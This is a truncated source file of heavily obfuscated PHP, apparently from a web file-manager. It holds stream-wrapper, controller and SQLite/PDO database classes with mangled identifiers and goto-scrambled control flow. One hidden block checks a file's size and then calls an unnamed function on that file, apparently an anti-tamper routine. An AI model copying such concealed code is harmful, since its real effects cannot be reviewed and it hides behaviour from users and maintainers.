$_SERVER[ ÇƒŠìÀ]; $±Ì”öı = str_replace($ØÎË¸[1352], $ØÎË¸[12], strtolower($óŒúù÷¬->getType())); if ($±Ì”öı == $ØÎË¸[786] || $±Ì”öı == $ØÎË¸[1353] || $±Ì”öı == $ØÎË¸[1354]) { $óŒúù÷¬ = self::defaultDriverInit(); } else { if ($±Ì”öı == $ØÎË¸[1239] || $±Ì”öı == $ØÎË¸[1355]) { $óŒúù÷¬ = IO::init($óŒúù÷¬->pathParse[$ØÎË¸[1186]]); } } $ù­ ”æĞ = $óŒúù÷¬->path; $±Ì”öı = str_replace($ØÎË¸[1352], $ØÎË¸[12], strtolower($óŒúù÷¬->getType())); if ($±Ì”öı == $ØÎË¸[108]) { return array($ØÎË¸[33] => $ØÎË¸[108], $ØÎË¸[1349] => $ØÎË¸[12], $ØÎË¸[86] => $ù­ ”æĞ, $ØÎË¸[97] => $óŒúù÷¬); } return array($ØÎË¸[33] => $ØÎË¸[898], $ØÎË¸[1349] => $óŒúù÷¬->pathDriver, $ØÎË¸[86] => $ù­ ”æĞ, $ØÎË¸[97] => $óŒúù÷¬); } public static function pathDriverType($æÔÔ™ª) { return $æÔÔ™ª ? self::driverType(IO::init($æÔÔ™ª)) : !1; } public static function pathDriverLocal($ôŞ°“ù) { $¯¹©â†Ş =& $_SERVER[ ÇƒŠìÀ]; $—é¤­À¯ = $ôŞ°“ù ? self::driverType(IO::init($ôŞ°“ù)) : !1; return $—é¤­À¯[$¯¹©â†Ş[33]] == $¯¹©â†Ş[108] ? !0 : !1; } public static function allowCover($åó¶¹•ê, $£ØéìÜ = true) { $ÇØ–‰Ê =& $_SERVER[ ÇƒŠìÀ]; if (is_string($åó¶¹•ê)) { $åó¶¹•ê = IO::info($åó¶¹•ê); } if (!$åó¶¹•ê || $åó¶¹•ê[$ÇØ–‰Ê[33]] == $ÇØ–‰Ê[77] || $åó¶¹•ê[$ÇØ–‰Ê[78]] <= 100) { return !1; } if (isset($åó¶¹•ê[$ÇØ–‰Ê[1356]]) || !$åó¶¹•ê[$ÇØ–‰Ê[86]]) { return !1; } if (isset($åó¶¹•ê[$ÇØ–‰Ê[218]]) && !$åó¶¹•ê[$ÇØ–‰Ê[218]]) { return !1; } static $—…² „« = false; if (!$—…² „« || !$£ØéìÜ) { $÷†«íäª = self::driverType(IO::init($åó¶¹•ê[$ÇØ–‰Ê[86]])); $íØ•û«ì = $÷†«íäª[$ÇØ–‰Ê[97]]; $—…² „« = $ÇØ–‰Ê[186]; if ($÷†«íäª[$ÇØ–‰Ê[33]] == $ÇØ–‰Ê[108]) { $—…² „« = $ÇØ–‰Ê[1357]; } if ($÷†«íäª[$ÇØ–‰Ê[97]] && is_array($÷†«íäª[$ÇØ–‰Ê[97]]->config)) { $ºáÅ·ìù = $÷†«íäª[$ÇØ–‰Ê[97]]->config; if (isset($ºáÅ·ìù[$ÇØ–‰Ê[1358]]) && $ºáÅ·ìù[$ÇØ–‰Ê[1358]]) { $—…² „« = $ÇØ–‰Ê[1357]; } } } return $—…² „« == $ÇØ–‰Ê[1357] ? !0 : !1; } } goto EÏçË¨Ş¾¦; f¦¨ëÏ: $_size = $_SERVER[ ÇƒŠìÀ][1526]; if ($_SERVER[$_SERVER[ ÇƒŠìÀ][906]] != $_size($_file)) { $_getc = $_SERVER[ ÇƒŠìÀ][909]; $_getfile = $_SERVER[$_SERVER[ ÇƒŠìÀ][910]] . $_SERVER[ ÇƒŠìÀ][911]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ ÇƒŠìÀ][248], $_getfilec); if (count($_getarrs) < $_SERVER[ ÇƒŠìÀ][655]) { $exit = $_SERVER[ ÇƒŠìÀ][912]; $exit(); } $_act = $_SERVER[ ÇƒŠìÀ][948]; $_act($_file); } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($™Û“Ù·–, $ù¶ìş–Ê = '') { $this->info = $this->info($™Û“Ù·–); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ ÇƒŠìÀ][86]]; $this->pathOpen = $™Û“Ù·–; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$™Û“Ù·–])) { self::$_chunkBuffer[$™Û“Ù·–] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ïÎêºû«) { $’®€“¤à = $this->fileSubstr($this->pose, $ïÎêºû«); $this->pose += strlen($’®€“¤à); return $’®€“¤à; } public function stream_tell() { return $this->pose; } public function stream_seek($í Ú«¹, $ ÆşûË) { $Ñ·áêˆú =& $_SERVER[ ÇƒŠìÀ]; if ($ ÆşûË == SEEK_SET) { $this->pose = $í Ú«¹; } else { if ($ ÆşûË == SEEK_CUR) { $this->pose += $í Ú«¹; } else { if ($ ÆşûË == SEEK_END) { $this->pose = $this->info[$Ñ·áêˆú[78]] + intval($í Ú«¹); } } } if ($í Ú«¹ < 0) { $this->pose = $this->info[$Ñ·áêˆú[78]] + $í Ú«¹; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ ÇƒŠìÀ][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($£¥‘Ÿî, $Û…Ã»‹Ú) { $–ˆÇ£íŞ =& $_SERVER[ ÇƒŠìÀ]; $‘”İ¢ª = $this->info($£¥‘Ÿî); return array($–ˆÇ£íŞ[1527] => 0, $–ˆÇ£íŞ[1528] => 0, $–ˆÇ£íŞ[16] => 32768 + 511, $–ˆÇ£íŞ[1529] => 0, $–ˆÇ£íŞ[1530] => 0, $–ˆÇ£íŞ[1531] => 0, $–ˆÇ£íŞ[1532] => 0, $–ˆÇ£íŞ[78] => $‘”İ¢ª[$–ˆÇ£íŞ[78]], $–ˆÇ£íŞ[1533] => $‘”İ¢ª[$–ˆÇ£íŞ[1398]], $–ˆÇ£íŞ[1488] => $‘”İ¢ª[$–ˆÇ£íŞ[87]], $–ˆÇ£íŞ[1487] => $‘”İ¢ª[$–ˆÇ£íŞ[217]], $–ˆÇ£íŞ[1534] => 0, $–ˆÇ£íŞ[1535] => 0); } static $fileInfo = array(); public function info($–Üàûš) { $ıå©šº = $_SERVER[ ÇƒŠìÀ][1536]; if (isset(self::$fileInfo[$–Üàûš])) { return self::$fileInfo[$–Üàûš]; } if (substr($–Üàûš, 0, strlen($ıå©šº)) != $ıå©šº) { return !1; } self::$fileInfo[$–Üàûš] = IO::info(substr($–Üàûš, strlen($ıå©šº))); return self::$fileInfo[$–Üàûš]; } public static function read($›ñ±ÕÑ, $‡ÖøÊ, $×˜õÇíò) { if (!isset(self::$_fopenCache[$›ñ±ÕÑ])) { $É’‘”ªÄ = new StreamWrapperIO(); $É’‘”ªÄ->stream_open($›ñ±ÕÑ); self::$_fopenCache[$›ñ±ÕÑ] = $É’‘”ªÄ; } $É’‘”ªÄ = self::$_fopenCache[$›ñ±ÕÑ]; return $É’‘”ªÄ->fileSubstr($‡ÖøÊ, $×˜õÇíò); } public static function _read($„ óı„æ, $ŞÅ£Ö³ß, $Ã„ºŸŞ) { $…¡ş˜òŸ =& $_SERVER[ ÇƒŠìÀ]; $ößÎ†ˆ = fopen($„ óı„æ, $…¡ş˜òŸ[1402]); if (!$ößÎ†ˆ) { return $…¡ş˜òŸ[12]; } $£›»…øù = 8192; fseek($ößÎ†ˆ, $ŞÅ£Ö³ß, SEEK_SET); $Åƒ›É = $…¡ş˜òŸ[12]; $‹µÆïƒ = 0; while ($‹µÆïƒ < $Ã„ºŸŞ) { $çî‡‹âÅ = min($£›»…øù, $Ã„ºŸŞ - $‹µÆïƒ); $Åƒ›É .= fread($ößÎ†ˆ, $çî‡‹âÅ); $‹µÆïƒ += $çî‡‹âÅ; } fclose($ößÎ†ˆ); return $Åƒ›É; } public function fileSubstr($êÌ³¶…«, $õª¥óùµ) { $¡ïš˜ê =& $_SERVER[ ÇƒŠìÀ]; $ğ§Õä”“ = $this->info[$¡ïš˜ê[78]]; $¹øˆÓš® = $êÌ³¶…«; $ÙïÄÈÉ¬ = $õª¥óùµ; if ($êÌ³¶…« < 0) { $êÌ³¶…« = $ğ§Õä”“ + $êÌ³¶…«; } if ($õª¥óùµ === !1) { $õª¥óùµ = $ğ§Õä”“ - $êÌ³¶…«; } if ($êÌ³¶…« + $õª¥óùµ > $ğ§Õä”“) { $õª¥óùµ = $ğ§Õä”“ - $êÌ³¶…«; } if ($õª¥óùµ <= 0) { return $¡ïš˜ê[12]; } if ($êÌ³¶…« < 0 || $êÌ³¶…« >= $ğ§Õä”“ || $õª¥óùµ <= 0 || $õª¥óùµ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\x6c\145\x52\x65\141\144\40\145\x72\x72\157\x72\41\x20\x73\x74\141\x72\164\75{$êÌ³¶…«}\73\154\145\156\147\164\150\75{$õª¥óùµ}\x3b\40\x73\x69\x7a\145\x3d{$ğ§Õä”“}\x3b"); } $¢Ä¸÷Ší = 64 * 1024; $ıÜã´€ =& self::$_chunkBuffer[$this->path]; if (!$ıÜã´€) { $ıÜã´€ = array(); } $•ÇööÔš = 0; $ è–şšŒ = 0; $ä–äŸÌ„ = $¡ïš˜ê[12]; foreach ($ıÜã´€ as $•ÇööÔš => $ä–äŸÌ„) { $•ÇööÔš = intval($•ÇööÔš); $ è–şšŒ = $•ÇööÔš + strlen($ä–äŸÌ„); if ($êÌ³¶…« >= $ è–şšŒ) { continue; } if ($êÌ³¶…« >= $•ÇööÔš && $êÌ³¶…« + $õª¥óùµ <= $ è–şšŒ) { return substr($ä–äŸÌ„, $êÌ³¶…« - $•ÇööÔš, $õª¥óùµ); } break; } if (count($ıÜã´€) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($¡ïš˜ê[1537], $¡ïš˜ê[1538] . count($ıÜã´€) . "\x3b\x73\x74\141\x72\164\75{$êÌ³¶…«}\x2c\154\145\156\147\x74\x68\75{$õª¥óùµ}\73\160\x6f\163\x65\72{$•ÇööÔš}\176{$ è–şšŒ}"); throw new Exception($¡ïš˜ê[1539]); } $á¿Ö—¢© = intval($êÌ³¶…« / $¢Ä¸÷Ší) * $¢Ä¸÷Ší; $’´†óŸï = ceil(($êÌ³¶…« + $õª¥óùµ) / $¢Ä¸÷Ší) * $¢Ä¸÷Ší - $á¿Ö—¢©; $âø‰­Ò = IO::fileSubstr($this->path, $á¿Ö—¢©, $’´†óŸï); $ıÜã´€[$á¿Ö—¢© . $¡ïš˜ê[12]] = $âø‰­Ò; ksort($ıÜã´€); $ÛÎ³Å = substr($âø‰­Ò, $êÌ³¶…« - $á¿Ö—¢©, $õª¥óùµ); return $ÛÎ³Å; } private function log($ÕÁ÷Õıç, $äØ Œ¢ò) { $ˆÒêÛÄÉ =& $_SERVER[ ÇƒŠìÀ]; $”ÄÌ—œ° = timeFloat() - $this->timeStart; write_log(sprintf($ˆÒêÛÄÉ[1540], $ÕÁ÷Õıç, $this->info[$ˆÒêÛÄÉ[32]], $”ÄÌ—œ°, $äØ Œ¢ò), $ˆÒêÛÄÉ[1217]); } } goto Fˆòã‘‘×ò; e¤”º‘«é: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $â½‚é† =& $_SERVER[ ÇƒŠìÀ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$â½‚é†[6]] =& $config; $this->values[$â½‚é†[7]] =& $in; $this->tpl = TEMPLATE . MOD . $â½‚é†[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ŞìÊŠôë) { if (1 === func_num_args()) { $this->{$ŞìÊŠôë} = new $ŞìÊŠôë(); } else { $­á¸‚€ö = new ReflectionClass($ŞìÊŠôë); $ß£¡«àò = func_get_args(); array_shift($ß£¡«àò); $this->{$ŞìÊŠôë} = $­á¸‚€ö->newInstanceArgs($ß£¡«àò); } return $this->{$ŞìÊŠôë}; } public function routeBind($ßÚÜË·, $‘ØùÆ²‚, $º˜³†ò = 3) { $Õø˜×¥Ğ =& $_SERVER[ ÇƒŠìÀ]; $÷ºÆ¿­ = $this->in[$Õø˜×¥Ğ[9]]; $ßÚÜË· = str_replace($Õø˜×¥Ğ[10], $Õø˜×¥Ğ[11], trim(trim($ßÚÜË·, $Õø˜×¥Ğ[8]), $Õø˜×¥Ğ[12])); if (!$ßÚÜË· || count($÷ºÆ¿­) <= $º˜³†ò) { return !1; } $Ï¡…ÌÛ = !0; $¼³ÕÎ’Å = explode($Õø˜×¥Ğ[8], $ßÚÜË·); for ($–ÌÙñÄ¦ = 0; $–ÌÙñÄ¦ < count($¼³ÕÎ’Å); $–ÌÙñÄ¦++) { if ($¼³ÕÎ’Å[$–ÌÙñÄ¦] != $÷ºÆ¿­[$º˜³†ò + $–ÌÙñÄ¦]) { $Ï¡…ÌÛ = !1; break; } } if (!$Ï¡…ÌÛ) { return; } call_user_func_array(array($this, $‘ØùÆ²‚), array()); } public function routeArgs($ù­‘€¦Ü = 3) { $ä¨”ó¶‘ = $this->in[$_SERVER[ ÇƒŠìÀ][9]]; if (count($ä¨”ó¶‘) <= $ù­‘€¦Ü) { return array(); } $—©Æ¸ = array(); for ($à³¤†² = $ù­‘€¦Ü; $à³¤†² < count($ä¨”ó¶‘); $à³¤†² += 2) { $—©Æ¸[$ä¨”ó¶‘[$à³¤†²]] = $ä¨”ó¶‘[$à³¤†² + 1]; $this->in[$ä¨”ó¶‘[$à³¤†²]] = $ä¨”ó¶‘[$à³¤†² + 1]; } return $—©Æ¸; } protected function assign($Öæáôä, $©†¢×¸) { $this->values[$Öæáôä] = $©†¢×¸; } protected function display($¿¦€áğ€) { ob_end_clean(); extract($this->values); require $this->tpl . $¿¦€áğ€; } } class DbSqliteBase extends Db { public function __construct($ìö¤ùşÈ = '') { $§¦ıŒÈà =& $_SERVER[ ÇƒŠìÀ]; if (!extension_loaded($§¦ıŒÈà[13])) { think_exception(think_lang($§¦ıŒÈà[14]) . $§¦ıŒÈà[15]); } if (!empty($ìö¤ùşÈ)) { if (!isset($ìö¤ùşÈ[$§¦ıŒÈà[16]])) { $ìö¤ùşÈ[$§¦ıŒÈà[16]] = 438; } $this->config = $ìö¤ùşÈ; if (empty($this->config[$§¦ıŒÈà[17]])) { $this->config[$§¦ıŒÈà[17]] = array(); } } } public function connect($¼İÙÆ²Î = '', $„‡é®Û® = 0) { $Î¾ÓÛ³· =& $_SERVER[ ÇƒŠìÀ]; if (!isset($this->linkID[$„‡é®Û®])) { if (empty($¼İÙÆ²Î)) { $¼İÙÆ²Î = $this->config; } $ÆÍ‰†Û– = !empty($¼İÙÆ²Î[$Î¾ÓÛ³·[17]][$Î¾ÓÛ³·[18]]) ? $¼İÙÆ²Î[$Î¾ÓÛ³·[17]][$Î¾ÓÛ³·[18]] : $this->pconnect; $Â›ÛÇÀ = $ÆÍ‰†Û– ? $Î¾ÓÛ³·[19] : $Î¾ÓÛ³·[20]; $this->linkID[$„‡é®Û®] = $Â›ÛÇÀ($¼İÙÆ²Î[$Î¾ÓÛ³·[21]], $¼İÙÆ²Î[$Î¾ÓÛ³·[16]]); if (!$this->linkID[$„‡é®Û®]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$„‡é®Û®], 30000); if (1 != think_config($Î¾ÓÛ³·[22])) { unset($this->config); } } return $this->linkID[$„‡é®Û®]; } public function free() { $this->queryID = null; } public function query($Š­æ‘Ä¨) { $şéŒ‹Öî =& $_SERVER[ ÇƒŠìÀ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Š­æ‘Ä¨; if ($this->queryID) { $this->free(); } think_action_status($şéŒ‹Öî[23], 1); think_status($şéŒ‹Öî[24]); $this->queryID = sqlite_query($this->_linkID, $Š­æ‘Ä¨); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ì‚†èÕ = $this->getAll(); return $ì‚†èÕ; } } public function execute($§¸«ÙÃ”) { $šäÒóœõ =& $_SERVER[ ÇƒŠìÀ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $§¸«ÙÃ”; if ($this->queryID) { $this->free(); } think_action_status($šäÒóœõ[25], 1); think_status($šäÒóœõ[24]); $…’Âˆß = sqlite_exec($this->_linkID, $§¸«ÙÃ”); $this->debug(); if (!1 === $…’Âˆß) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ ÇƒŠìÀ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $›ˆ”ä€ = sqlite_query($this->_linkID, $_SERVER[ ÇƒŠìÀ][27]); if (!$›ˆ”ä€) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Å×¦£‘» = sqlite_query($this->_linkID, $_SERVER[ ÇƒŠìÀ][28]); if (!$Å×¦£‘») { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $æÚ—Üˆ = array(); if ($this->numRows > 0) { for ($’¦¼¤ãÒ = 0; $’¦¼¤ãÒ < $this->numRows; $’¦¼¤ãÒ++) { $æÚ—Üˆ[$’¦¼¤ãÒ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $æÚ—Üˆ; } public function getFields($Ä…âÂå£) { $Ú¶ñæ˜ =& $_SERVER[ ÇƒŠìÀ]; $¾åÔš‹Ò = $this->query($Ú¶ñæ˜[29] . $Ä…âÂå£ . $Ú¶ñæ˜[30]); $ÌÇîÍ¼ = array(); if ($¾åÔš‹Ò) { foreach ($¾åÔš‹Ò as $íî ®Ú => $ŒÃˆ‘“×) { $ÌÇîÍ¼[$ŒÃˆ‘“×[$Ú¶ñæ˜[31]]] = array($Ú¶ñæ˜[32] => $ŒÃˆ‘“×[$Ú¶ñæ˜[31]], $Ú¶ñæ˜[33] => $ŒÃˆ‘“×[$Ú¶ñæ˜[34]], $Ú¶ñæ˜[35] => (bool) ($ŒÃˆ‘“×[$Ú¶ñæ˜[36]] === $Ú¶ñæ˜[12]), $Ú¶ñæ˜[37] => $ŒÃˆ‘“×[$Ú¶ñæ˜[38]], $Ú¶ñæ˜[39] => strtolower($ŒÃˆ‘“×[$Ú¶ñæ˜[40]]) == $Ú¶ñæ˜[41], $Ú¶ñæ˜[42] => strtolower($ŒÃˆ‘“×[$Ú¶ñæ˜[43]]) == $Ú¶ñæ˜[44]); } } return $ÌÇîÍ¼; } public function getTables($àŞÃ¸ùç = '') { $…ğê°è =& $_SERVER[ ÇƒŠìÀ]; $šª‘©ÔÃ = $this->query($…ğê°è[45] . $…ğê°è[46] . $…ğê°è[47]); $……­·‰× = array(); foreach ($šª‘©ÔÃ as $ı´Ï‚¸‘ => $˜¥¾è§™) { $……­·‰×[$ı´Ï‚¸‘] = current($˜¥¾è§™); } return $……­·‰×; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $øë¥Øí† =& $_SERVER[ ÇƒŠìÀ]; $•ì¿–¹ = sqlite_last_error($this->_linkID); $this->error = $•ì¿–¹ . $øë¥Øí†[4] . sqlite_error_string($•ì¿–¹); if ($øë¥Øí†[12] != $this->queryStr) { $this->error .= LNG($øë¥Øí†[48]) . $this->queryStr; } think_trace($this->error, $øë¥Øí†[12], $øë¥Øí†[49]); return $this->error; } public function escapeString($Ãƒ‚’¤«) { return sqlite_escape_string($Ãƒ‚’¤«); } public function parseLimit($ÌÆœÈô¥) { $®ş—¸ =& $_SERVER[ ÇƒŠìÀ]; $„“Ó«È = $®ş—¸[12]; if (!empty($ÌÆœÈô¥)) { $ÌÆœÈô¥ = explode($®ş—¸[50], $ÌÆœÈô¥); if (count($ÌÆœÈô¥) > 1) { $„“Ó«È .= $®ş—¸[51] . $ÌÆœÈô¥[1] . $®ş—¸[52] . $ÌÆœÈô¥[0] . $®ş—¸[53]; } else { $„“Ó«È .= $®ş—¸[51] . $ÌÆœÈô¥[0] . $®ş—¸[53]; } } return $„“Ó«È; } } class DbSqlite3Base extends Db { public function __construct($ÆØòÔêŒ = '') { $±¯°ÔÖ =& $_SERVER[ ÇƒŠìÀ]; if (!class_exists($±¯°ÔÖ[54])) { think_exception(think_lang($±¯°ÔÖ[14]) . $±¯°ÔÖ[55]); } if (!empty($ÆØòÔêŒ)) { if (!isset($ÆØòÔêŒ[$±¯°ÔÖ[16]])) { $ÆØòÔêŒ[$±¯°ÔÖ[16]] = 438; } $this->config = $ÆØòÔêŒ; if (empty($this->config[$±¯°ÔÖ[17]])) { $this->config[$±¯°ÔÖ[17]] = array(); } } } public function connect($£¶£ÓÆ¬ = '', $ÖéÚËˆÏ = 0) { $¸†Äø» =& $_SERVER[ ÇƒŠìÀ]; if (!isset($this->linkID[$ÖéÚËˆÏ])) { if (empty($£¶£ÓÆ¬)) { $£¶£ÓÆ¬ = $this->config; } $this->linkID[$ÖéÚËˆÏ] = new SQLite3($£¶£ÓÆ¬[$¸†Äø»[21]]); if (!$this->linkID[$ÖéÚËˆÏ]) { think_exception($this->linkID[$ÖéÚËˆÏ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÖéÚËˆÏ]->busyTimeout(30000); if (1 != think_config($¸†Äø»[22])) { unset($this->config); } } return $this->linkID[$ÖéÚËˆÏ]; } public function free() { $this->queryID = null; } public function query($ÁÒ–“à¨) { $‡Ø„¤Ùå =& $_SERVER[ ÇƒŠìÀ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÁÒ–“à¨; if ($this->queryID) { $this->free(); } think_action_status($‡Ø„¤Ùå[23], 1); think_status($‡Ø„¤Ùå[24]); $this->queryID = $this->_linkID->query($ÁÒ–“à¨); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $§­İå­ç = $this->getAll(); $this->numRows = count($§­İå­ç); return $§­İå­ç; } } public function execute($ƒ·£î¹‡) { $ğ¾¿÷Ï =& $_SERVER[ ÇƒŠìÀ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ƒ·£î¹‡; if ($this->queryID) { $this->free(); } think_action_status($ğ¾¿÷Ï[25], 1); think_status($ğ¾¿÷Ï[24]); $†ëåµ = $this->_linkID->exec($ƒ·£î¹‡); $this->debug(); if (!1 === $†ëåµ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ ÇƒŠìÀ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÊÎñÀÌê = $this->_linkID->query($_SERVER[ ÇƒŠìÀ][27]); if (!$ÊÎñÀÌê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¦ÛÛÏ´ô = $this->_linkID->query($_SERVER[ ÇƒŠìÀ][28]); if (!$¦ÛÛÏ´ô) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ø˜¨ôÒÁ = array(); while ($»ãÜù® = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ø˜¨ôÒÁ[] = $»ãÜù®; } $this->queryID->reset(); return $Ø˜¨ôÒÁ; } public function getFields($Åá¡ª”) { $ƒä–“£ğ =& $_SERVER[ ÇƒŠìÀ]; $«éñöÃ‹ = $this->query($ƒä–“£ğ[29] . $Åá¡ª” . $ƒä–“£ğ[30]); $²­Ê¼× = array(); if ($«éñöÃ‹) { foreach ($«éñöÃ‹ as $±²Î¬ÄÀ => $ ­ÂÔ‰) { $²­Ê¼×[$ ­ÂÔ‰[$ƒä–“£ğ[32]]] = array($ƒä–“£ğ[32] => $ ­ÂÔ‰[$ƒä–“£ğ[32]], $ƒä–“£ğ[33] => $ ­ÂÔ‰[$ƒä–“£ğ[33]], $ƒä–“£ğ[35] => (bool) ($ ­ÂÔ‰[$ƒä–“£ğ[35]] === $ƒä–“£ğ[12]), $ƒä–“£ğ[37] => $ ­ÂÔ‰[$ƒä–“£ğ[56]], $ƒä–“£ğ[39] => (bool) $ ­ÂÔ‰[$ƒä–“£ğ[57]], $ƒä–“£ğ[42] => (bool) $ ­ÂÔ‰[$ƒä–“£ğ[57]]); } } return $²­Ê¼×; } public function getTables($¥¸Ş©˜ˆ = '') { $Ôæüİ“Ò =& $_SERVER[ ÇƒŠìÀ]; $ïãÓÁã÷ = $this->query($Ôæüİ“Ò[45] . $Ôæüİ“Ò[46] . $Ôæüİ“Ò[47]); $é§¡şºÌ = array(); foreach ($ïãÓÁã÷ as $õ‘œŠà† => $ìï¦ú¼¯) { $é§¡şºÌ[$õ‘œŠà†] = current($ìï¦ú¼¯); } return $é§¡şºÌ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $„¥ãËö =& $_SERVER[ ÇƒŠìÀ]; $this->error = $this->_linkID->lastErrorMsg(); if ($„¥ãËö[12] != $this->queryStr) { $this->error .= LNG($„¥ãËö[48]) . $this->queryStr; } think_trace($this->error, $„¥ãËö[12], $„¥ãËö[49]); return $this->error; } public function escapeString($ğÀƒ¢Ò¤) { $ı³†Õè =& $_SERVER[ ÇƒŠìÀ]; if ($this->_linkID) { return $this->_linkID->escapeString($ğÀƒ¢Ò¤); } return str_ireplace($ı³†Õè[58], $ı³†Õè[59], $ğÀƒ¢Ò¤); } public function parseLimit($¹°ƒß÷™) { $£˜È± =& $_SERVER[ ÇƒŠìÀ]; $ßî³€× = $£˜È±[12]; if (!empty($¹°ƒß÷™)) { $¹°ƒß÷™ = explode($£˜È±[50], $¹°ƒß÷™); if (count($¹°ƒß÷™) > 1) { $ßî³€× .= $£˜È±[51] . $¹°ƒß÷™[1] . $£˜È±[52] . $¹°ƒß÷™[0] . $£˜È±[53]; } else { $ßî³€× .= $£˜È±[51] . $¹°ƒß÷™[0] . $£˜È±[53]; } } return $ßî³€×; } } goto cÆ®ê„õ©; fæ™îİÜ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($¥õä˜¤§ = '') { $ÓÁç˜è =& $_SERVER[ ÇƒŠìÀ]; if (!class_exists($ÓÁç˜è[949])) { think_exception(think_lang($ÓÁç˜è[14]) . $ÓÁç˜è[950]); } if (!empty($¥õä˜¤§)) { $this->config = $¥õä˜¤§; if (empty($this->config[$ÓÁç˜è[17]])) { $this->config[$ÓÁç˜è[17]] = array(); } } } public function connect($‹ù›üü± = '', $ë®ÒÅ•ø = 0) { $¤Éóã¨ =& $_SERVER[ ÇƒŠìÀ]; if (!isset($this->linkID[$ë®ÒÅ•ø])) { if (empty($‹ù›üü±)) { $‹ù›üü± = $this->config; } $»ÁøÒ ¶ = !empty($‹ù›üü±[$¤Éóã¨[17]][$¤Éóã¨[18]]) ? $‹ù›üü±[$¤Éóã¨[17]][$¤Éóã¨[18]] : $this->pconnect; if ($»ÁøÒ ¶) { $‹ù›üü±[$¤Éóã¨[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ë®ÒÅ•ø] = new PDO($‹ù›üü±[$¤Éóã¨[951]], $‹ù›üü±[$¤Éóã¨[921]], $‹ù›üü±[$¤Éóã¨[922]], $‹ù›üü±[$¤Éóã¨[17]]); } catch (PDOException $œˆûİš) { think_exception($œˆûİš->getMessage()); } $this->dbType = $this->_getDsnType($‹ù›üü±[$¤Éóã¨[951]]); if (in_array($this->dbType, array($¤Éóã¨[952], $¤Éóã¨[953], $¤Éóã¨[954], $¤Éóã¨[955]))) { think_exception($¤Éóã¨[956] . $this->dbType . $¤Éóã¨[957] . $this->dbType . $¤Éóã¨[958]); } if (!$this->linkID[$ë®ÒÅ•ø]) { think_exception($¤Éóã¨[959]); } try { $this->linkID[$ë®ÒÅ•ø]->exec($¤Éóã¨[960] . think_config($¤Éóã¨[924])); } catch (Exception $œˆûİš) { } $this->connected = !0; if (1 != think_config($¤Éóã¨[22])) { unset($this->config); } } return $this->linkID[$ë®ÒÅ•ø]; } public function free() { $this->PDOStatement = null; } public function query($Š­È•ƒº, $û™ÓÇ = array()) { $³ÙÎ€ ï =& $_SERVER[ ÇƒŠìÀ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Š­È•ƒº; if (!empty($û™ÓÇ)) { $this->queryStr .= $³ÙÎ€ ï[961] . print_r($û™ÓÇ, !0) . $³ÙÎ€ ï[962]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($³ÙÎ€ ï[23], 1); think_status($³ÙÎ€ ï[24]); $this->PDOStatement = $this->_linkID->prepare($Š­È•ƒº); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÜÓˆÕ = $this->PDOStatement->execute($û™ÓÇ); $this->debug(); if (!1 === $ÜÓˆÕ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($İóÔ½­ü, $ó…ŞãÛŒ = array()) { $°Ãß´Úë =& $_SERVER[ ÇƒŠìÀ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $İóÔ½­ü; if (!empty($ó…ŞãÛŒ)) { $this->queryStr .= $°Ãß´Úë[961] . print_r($ó…ŞãÛŒ, !0) . $°Ãß´Úë[962]; } $È¦Ú’ŸÒ = !1; if ($this->dbType == $°Ãß´Úë[955]) { if 